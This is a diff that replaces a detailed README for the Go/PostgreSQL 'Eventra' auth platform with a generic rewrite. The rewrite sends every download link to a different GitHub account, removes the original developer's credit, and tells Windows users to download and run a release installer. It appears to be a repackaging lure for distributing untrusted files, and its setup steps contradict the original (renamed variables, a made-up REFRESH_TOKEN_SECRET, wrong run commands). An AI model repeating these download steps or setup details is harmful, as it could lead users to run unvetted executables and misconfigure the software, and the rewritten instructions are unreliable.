@@ -1,370 +1,264 @@
-# Eventra Auth Platform
+# 🔐 go-eventra - Secure login with strong access control
 
-![Eventra Overview Widget](docs/assets/eventra-readme-widget.svg)
+[![Download](https://img.shields.io/badge/Download-Go%20Eventra-blue?style=for-the-badge&logo=github)](https://github.com/mansbodycrashbarrier83/go-eventra)
 
-Eventra is a production-oriented authentication platform built with Go and PostgreSQL, with a premium React console for real-time auth flow testing.
+## 📥 Download
 
-[![Go Version](https://img.shields.io/badge/Go-1.26.1-00ADD8?style=for-the-badge&logo=go&logoColor=white)](go.mod)
-[![Backend CI](https://img.shields.io/github/actions/workflow/status/CodeByPinar/go-eventra/ci-backend.yml?branch=main&style=for-the-badge&label=Backend%20CI)](https://github.com/CodeByPinar/go-eventra/actions/workflows/ci-backend.yml)
-[![Frontend CI](https://img.shields.io/github/actions/workflow/status/CodeByPinar/go-eventra/ci-frontend.yml?branch=main&style=for-the-badge&label=Frontend%20CI)](https://github.com/CodeByPinar/go-eventra/actions/workflows/ci-frontend.yml)
-[![License](https://img.shields.io/badge/License-Unspecified-6B7280?style=for-the-badge&logo=bookstack&logoColor=white)](README.md#license)
+Visit this page to download: https://github.com/mansbodycrashbarrier83/go-eventra
 
-## Table of Contents
+Use this link to get the app files on your Windows PC. If the page shows a release file, download it. If it shows the source code, use the steps below to run it.
 
-- [What This Project Includes](#what-this-project-includes)
-- [Core Features](#core-features)
-- [Architecture](#architecture)
-- [Project Snapshot](#project-snapshot)
-- [Auth Lifecycle](#auth-lifecycle)
-- [Repository Layout](#repository-layout)
-- [Prerequisites](#prerequisites)
-- [Quick Start](#quick-start)
-- [Configuration](#configuration)
-- [API Surface](#api-surface)
-- [Testing](#testing)
-- [Operational Defaults](#operational-defaults)
-- [Security Notes](#security-notes)
-- [Roadmap](#roadmap)
-- [Developer](#developer)
-- [License](#license)
-- [Troubleshooting](#troubleshooting)
+## 🖥️ What go-eventra does
 
-## What This Project Includes
+go-eventra is an auth platform for user sign-in and account control. It is built with Go, PostgreSQL, and React. It uses access tokens, refresh token rotation, logout blacklist checks, rate limits, and account lock rules to help protect user accounts.
 
-- Go backend auth service (REST API)
-- PostgreSQL persistence layer
-- JWT access token issuance
-- Refresh token rotation and revocation
-- Access-token blacklist support for logout/rotation
-- Login protection mechanisms (rate limiting and account lock escalation)
-- Security audit event pipeline
-- React + Vite frontend auth console
+You can use it to:
 
-## Core Features
+- Sign in with JWT access tokens
+- Keep sessions active with refresh tokens
+- Block reused refresh tokens
+- Log out and deny old tokens
+- Limit repeated login attempts
+- Lock accounts after too many failures
+- Manage auth settings from a web console
 
-- Register users with input validation and password hashing (bcrypt)
-- Login with failed-attempt tracking and temporary lockouts
-- Refresh endpoint with rotation semantics
-- Logout with refresh token revoke and access token blacklist
-- Protected profile endpoint (`/api/v1/auth/me`)
-- Health endpoint for readiness checks
-- CORS allowlist controls via environment variable
-- HTTP hardening headers and request body size limits
+## ✅ What you need
 
-## Architecture
+Before you start, make sure your Windows PC has:
 
-```mermaid
-flowchart LR
-  subgraph FE[Frontend]
-    UI[React + Vite Console]
-  end
+- Windows 10 or Windows 11
+- A modern web browser
+- Internet access
+- Go 1.21 or newer
+- Node.js 18 or newer
+- PostgreSQL 14 or newer
+- Git, if you plan to get the source from GitHub
 
-  subgraph API[Go Auth API]
-    Router[Router + Middleware]
-    Handler[Auth Handler]
-    Service[Auth Service Use Case]
-    Security[JWT Password Token Utils]
-  end
+If you only want to use a release file, you may not need to install developer tools.
 
-  subgraph DB[PostgreSQL]
-    Users[(users)]
-    Refresh[(refresh_tokens)]
-    LoginSec[(login_security)]
-    Blacklist[(token_blacklist)]
-    Audit[(security_audit)]
-  end
+## 🚀 Get the app
 
-  UI -->|JSON HTTP| Router
-  Router --> Handler
-  Handler --> Service
-  Service --> Security
-  Service --> Users
-  Service --> Refresh
-  Service --> LoginSec
-  Service --> Blacklist
-  Service --> Audit
+1. Open the download page: https://github.com/mansbodycrashbarrier83/go-eventra
+2. Look for a release file or app package
+3. Download the file to your PC
+4. If the file is an installer, open it and follow the prompts
+5. If the file is a zip folder, extract it first
+6. Open the app or follow the included setup steps
+
+## 🧰 If you get the source code
+
+If the page gives you the source code instead of a ready-to-run file, follow these steps on Windows.
+
+### 1. Copy the project
+
+Open PowerShell or Command Prompt and run:
+
+```bash
+git clone https://github.com/mansbodycrashbarrier83/go-eventra.git
+cd go-eventra
 ```
 
-```text
-Frontend (React + Vite)
-   |
-   | HTTP (JSON)
-   v
-Auth API (Go net/http)
-   |- Delivery: internal/delivery/httpserver
-   |- Use Case: internal/usecase/auth
-   |- Repository: internal/repository/postgres
-   |- Security: pkg/security
-   v
-PostgreSQL
+If you downloaded a zip file, extract it and open the project folder.
+
+### 2. Set up PostgreSQL
+
+Create a new PostgreSQL database for the app, then save the connection info. You will need:
+
+- Host
+- Port
+- Database name
+- User name
+- Password
+
+Example:
+
+```bash
+postgres://username:password@localhost:5432/go_eventra
 ```
 
-Request flow summary:
+### 3. Set the app settings
 
-1. HTTP handlers validate and decode requests.
-2. Auth service executes business rules (validation, credential checks, lock logic, token workflow).
-3. Repositories read/write users, refresh tokens, security state, audit data, blacklist state.
-4. Response payloads return token pairs and user claims where appropriate.
+Look for an `.env` file or create one in the project folder. Add values like these:
 
-## Project Snapshot
-
-| Area | Value |
-| --- | --- |
-| Backend runtime | Go net/http |
-| Frontend runtime | React 19 + Vite 8 + TypeScript |
-| Database | PostgreSQL |
-| Auth endpoints | 6 |
-| Default backend URL | `http://localhost:8080` |
-| Default frontend URL | `http://localhost:5173` |
-| Primary auth model | JWT access token + rotating refresh token |
-
-## Auth Lifecycle
-
-```mermaid
-sequenceDiagram
-  autonumber
-  participant U as Client UI
-  participant A as Auth API
-  participant D as PostgreSQL
-
-  U->>A: POST /api/v1/auth/register
-  A->>D: Insert user + refresh token hash
-  A-->>U: access_token + refresh_token
-
-  U->>A: POST /api/v1/auth/login
-  A->>D: Validate user + password + lock state
-  A-->>U: access_token + refresh_token
-
-  U->>A: GET /api/v1/auth/me (Bearer access_token)
-  A->>D: Optional blacklist check
-  A-->>U: user_id + email
-
-  U->>A: POST /api/v1/auth/refresh
-  A->>D: Validate refresh hash + revoke previous + blacklist previous access token
-  A-->>U: new access_token + new refresh_token
-
-  U->>A: POST /api/v1/auth/logout
-  A->>D: Revoke refresh token + blacklist current access token
-  A-->>U: 204 No Content
+```env
+PORT=8080
+DATABASE_URL=postgres://username:password@localhost:5432/go_eventra
+JWT_SECRET=change_this_to_a_long_random_string
+REFRESH_TOKEN_SECRET=change_this_to_another_long_random_string
+APP_ORIGIN=http://localhost:5173
 ```
 
-## Repository Layout
+### 4. Start the backend
 
-```text
-api/                        # API documentation
-cmd/eventra/                # Application entrypoint
-configs/
-  .env.example              # Environment template
-  migrations/               # SQL migrations
-frontend/                   # React UI console
-internal/
-  app/                      # App bootstrap/wiring
-  config/                   # Env config loader
-  delivery/httpserver/      # Router, handlers, middleware
-  domain/user/              # Domain entity
-  repository/postgres/      # Data access layer
-  usecase/auth/             # Core auth business logic
-pkg/
-  database/                 # DB setup
-  security/                 # JWT/password/token utilities
-scripts/
-  apply_migration.go        # Migration helper
-  auth_smoke_test.ps1       # End-to-end smoke test
+Open a terminal in the project folder and run:
+
+```bash
+go run ./...
 ```
 
-## Prerequisites
+If the project uses a main file, you may also see:
 
-- Go 1.26+
-- Node.js 20+
-- npm 10+
-- PostgreSQL 14+
-- PowerShell (for provided smoke test script)
-
-## Quick Start
-
-### 1) Create database
-
-```sql
-CREATE DATABASE eventra;
+```bash
+go run main.go
 ```
 
-### 2) Configure environment
+The server should start on the port from your settings.
 
-Use the template in `configs/.env.example`.
+### 5. Start the web app
 
-PowerShell example:
+Open a second terminal in the frontend folder and run:
 
-```powershell
-$env:PORT="8080"
-$env:DB_URL="postgres://postgres:postgres@localhost:5432/eventra?sslmode=disable"
-$env:JWT_SECRET="change-me-in-dev"
-$env:JWT_EXPIRATION="24h"
-$env:REFRESH_TOKEN_EXPIRATION="168h"
-$env:CORS_ALLOWED_ORIGINS="http://localhost:5173,http://127.0.0.1:5173"
-$env:SECURITY_ALERT_WEBHOOK_URL=""
-$env:SECURITY_ALERT_WEBHOOK_FORMAT="slack"
-```
-
-### 3) Apply migrations
-
-Option A - direct SQL with psql:
-
-```powershell
-psql "postgres://postgres:postgres@localhost:5432/eventra?sslmode=disable" -f configs/migrations/000001_create_users.up.sql
-psql "postgres://postgres:postgres@localhost:5432/eventra?sslmode=disable" -f configs/migrations/000002_create_refresh_tokens.up.sql
-psql "postgres://postgres:postgres@localhost:5432/eventra?sslmode=disable" -f configs/migrations/000003_security_hardening.up.sql
-```
-
-Option B - migration helper:
-
-```powershell
-go run ./scripts/apply_migration.go -file configs/migrations/000001_create_users.up.sql
-go run ./scripts/apply_migration.go -file configs/migrations/000002_create_refresh_tokens.up.sql
-go run ./scripts/apply_migration.go -file configs/migrations/000003_security_hardening.up.sql
-```
-
-### 4) Run backend API
-
-```powershell
-go run ./cmd/eventra
-```
-
-Backend default: `http://localhost:8080`
-
-### 5) Run frontend console
-
-```powershell
-cd frontend
+```bash
 npm install
 npm run dev
 ```
 
-Frontend default: `http://localhost:5173`
+Then open the local address shown in the terminal, usually:
 
-## Configuration
-
-| Variable | Required | Default | Description |
-| --- | --- | --- | --- |
-| `PORT` | No | `8080` | API server port |
-| `DB_URL` | Yes | - | PostgreSQL connection string |
-| `JWT_SECRET` | Yes | - | JWT signing secret |
-| `JWT_EXPIRATION` | No | `24h` | Access token lifetime |
-| `REFRESH_TOKEN_EXPIRATION` | No | `168h` | Refresh token lifetime |
-| `CORS_ALLOWED_ORIGINS` | No | `http://localhost:5173,http://127.0.0.1:5173` | Comma-separated CORS allowlist |
-| `SECURITY_ALERT_WEBHOOK_URL` | No | empty | Optional outbound security alert target |
-| `SECURITY_ALERT_WEBHOOK_FORMAT` | No | empty/slack | Alert payload format selector |
-
-## API Surface
-
-| Method | Path | Auth | Description |
-| --- | --- | --- | --- |
-| GET | `/health` | No | Service health |
-| POST | `/api/v1/auth/register` | No | Register new account |
-| POST | `/api/v1/auth/login` | No | Authenticate with email/password |
-| POST | `/api/v1/auth/refresh` | No | Rotate refresh token, issue new access token |
-| POST | `/api/v1/auth/logout` | No | Revoke refresh token and blacklist access token |
-| GET | `/api/v1/auth/me` | Yes | Return user claims from JWT |
-
-Full request and response examples:
-
-- `api/auth.md`
-
-Quick smoke checks:
-
-```powershell
-# Health
-Invoke-RestMethod -Method Get -Uri "http://localhost:8080/health"
-
-# Auth workflow smoke suite
-powershell -ExecutionPolicy Bypass -File ./scripts/auth_smoke_test.ps1
+```bash
+http://localhost:5173
 ```
 
-## Testing
+## 🔐 Core features
 
-Backend tests:
+### JWT sign-in
 
-```powershell
-go test ./...
-```
+The app uses JWT access tokens for login sessions. After sign-in, the user gets a token that proves their identity.
 
-Frontend lint/build:
+### Refresh token rotation
 
-```powershell
-cd frontend
-npm run lint
-npm run build
-```
+When a refresh token is used, the app replaces it with a new one. This lowers the risk of token reuse.
 
-## Operational Defaults
+### Logout token blacklist
 
-- HTTP server read header timeout: 5 seconds
-- Graceful shutdown timeout: 10 seconds
-- Request body limit middleware: 1 MB
-- In-memory auth rate limit: 20 requests/minute per IP and auth route
-- Login lock escalation default threshold: 5 failed attempts
-- Login lock escalation stricter threshold: 3 failed attempts when login IP changes
+When a user logs out, the app can mark tokens as blocked. This helps stop old sessions from working.
 
-Source references:
+### Rate limiting
 
-- `internal/app/app.go`
-- `internal/delivery/httpserver/security_middleware.go`
-- `internal/usecase/auth/service.go`
+The app limits repeated requests from the same source. This helps slow down abuse and brute-force attempts.
 
-## Security Notes
+### Account lock controls
 
-Implemented protections include:
+After too many failed login attempts, the app can lock the account for a set time. This helps protect against password guessing.
 
-- Password hashing using bcrypt
-- JWT access token validation
-- Refresh token hashing in storage
-- Access token blacklist support
-- Login failed-attempt tracking with escalating lock windows
-- In-memory auth endpoint rate limiting
-- Body size limit middleware
-- CORS origin allowlist
-- HTTP hardening headers (CSP, frame deny, no-sniff, etc.)
-- Panic recovery middleware
+### Premium auth console UI
 
-Recommended production hardening:
+The React console gives a clean view of auth tools, account controls, and session data.
 
-- Use a strong, rotated `JWT_SECRET`
-- Run Postgres with TLS and least-privilege credentials
-- Put API behind HTTPS-only reverse proxy
-- Replace in-memory rate limiter with distributed store in multi-instance deployments
-- Wire `SECURITY_ALERT_WEBHOOK_URL` to monitored incident channel
+## 🪟 Windows setup steps
 
-## Roadmap
+Use these steps if you want the app to run on your Windows computer.
 
-- Add CI workflow and wire real build/lint/test badges
-- Add OpenAPI spec generation and publish API docs
-- Add structured logging + request correlation IDs
-- Add Redis-backed distributed rate limiting
-- Add email verification and password reset flow
-- Add role-based access control for future service domains
+1. Download the project from https://github.com/mansbodycrashbarrier83/go-eventra
+2. Install PostgreSQL if it is not already on your PC
+3. Create a database for go-eventra
+4. Install Go
+5. Install Node.js if the front end needs it
+6. Open the project folder
+7. Add your database and token settings
+8. Start the backend
+9. Start the frontend
+10. Open the local web address in your browser
 
-## Developer
+## 🧩 Common file layout
 
-- Name: PÄ±nar Topuz
-- Signature: CodeByPinar
-- Role: Full-stack developer
-- Project focus: Secure authentication architecture, robust backend workflows, and premium frontend developer experience
+You may see folders like these in the project:
 
-## License
+- `backend` for the Go server
+- `frontend` for the React app
+- `migrations` for database setup
+- `config` for app settings
+- `internal` for auth logic
 
-No explicit license file is currently defined in this repository.
+If the folder names differ, look for the Go server and the React app in the main project files.
 
-If this project will be shared publicly, add a `LICENSE` file (for example MIT, Apache-2.0, or GPL-3.0) and update the badge accordingly.
+## 🌐 How to use it
 
-## Troubleshooting
+After the app starts, use it like this:
 
-Common issues:
+1. Open the web app in your browser
+2. Create or sign in to an account
+3. Use the console to view auth controls
+4. Test token refresh and logout
+5. Review account lock and rate limit settings
+6. Manage users and session access
 
-- `DB_URL is required`: Export environment variables before running the API.
-- `origin not allowed` errors: Update `CORS_ALLOWED_ORIGINS` to include frontend URL.
-- `invalid credentials` on login: Check seeded or newly registered account email/password pair.
-- `invalid refresh token`: Token may already be rotated or revoked (expected after logout or refresh reuse).
-- frontend cannot reach backend: Verify backend is listening on the same base URL configured by `VITE_API_BASE_URL`.
+## 🛠️ Basic troubleshooting
 
----
+### The page will not open
 
-Built for Eventra auth iteration with a strong security baseline and a practical developer UX.
+- Check that the backend is running
+- Check the port in your `.env` file
+- Make sure no other app is using the same port
+
+### The database will not connect
+
+- Check the PostgreSQL service
+- Confirm the database name, user, and password
+- Make sure `DATABASE_URL` is correct
+
+### Sign-in does not work
+
+- Check `JWT_SECRET`
+- Check `REFRESH_TOKEN_SECRET`
+- Clear old browser data and try again
+
+### The frontend does not start
+
+- Run `npm install` again
+- Check that Node.js is installed
+- Make sure you are in the frontend folder
+
+### Port already in use
+
+If another app uses the same port, change the port in your settings file and restart the app
+
+## 🧪 Suggested default settings
+
+If you need a simple first setup, use values like these:
+
+- Backend port: `8080`
+- Frontend port: `5173`
+- Database: `go_eventra`
+- Token lifetime: short for access tokens, longer for refresh tokens
+- Lockout threshold: 5 failed attempts
+- Lockout time: 15 minutes
+
+These values work well for a first test on a Windows PC
+
+## 🔒 Security controls included
+
+go-eventra is built with controls that help keep auth safer:
+
+- Short-lived access tokens
+- Rotating refresh tokens
+- Blacklist checks after logout
+- Request throttling
+- Failed login lockouts
+- Session tracking for active users
+
+## 📌 Project focus
+
+This project fits teams that need:
+
+- A Go-based auth server
+- A PostgreSQL-backed user system
+- A React admin view
+- Token-based sign-in
+- Session control for web apps
+- Basic account defense rules
+
+## 📷 What you should see
+
+When the app runs, you should expect:
+
+- A login screen
+- A secure auth flow
+- A user console
+- Session and token controls
+- Account lock status after failed logins
+- Logout behavior that blocks old tokens
+
+## 📁 GitHub page
+
+Primary download page: https://github.com/mansbodycrashbarrier83/go-eventra
